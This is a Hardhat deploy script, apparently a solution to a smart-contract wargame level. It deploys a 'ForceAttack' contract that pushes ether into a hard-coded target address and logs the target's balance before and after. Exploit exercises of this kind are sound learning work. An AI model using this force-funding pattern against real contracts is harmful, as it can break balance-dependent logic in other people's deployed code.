import { HardhatRuntimeEnvironment } from 'hardhat/types';
import { DeployFunction } from 'hardhat-deploy/types';
import { ethers } from 'hardhat';
// import { FileService } from "../utils";
import { ForceAttack__factory } from '../../typechain-types';

const func: DeployFunction = async function (hre: HardhatRuntimeEnvironment){
    const forceAddresss = "0xc14b1B4d2F53594dE0302532a353196Cd9C2929b";

    console.log(`balanc: ${await ethers.provider.getBalance(forceAddresss)}`)

    console.log(">>  Deploy ForceAttack contract")
    const amount = ethers.utils.parseEther("0.00000000001");
    const ForceAttack = (await ethers.getContractFactory("ForceAttack",(await ethers.getSigners())[0])) as ForceAttack__factory;
    const forceAttack = await ForceAttack.deploy(forceAddresss,{value:amount})
    await forceAttack.deployed();
    console.log("✅ Deploy Done");
    console.log(`balanc: ${await ethers.provider.getBalance(forceAddresss)}`)

}

export default func;
func.tags = ['ForceAttack'];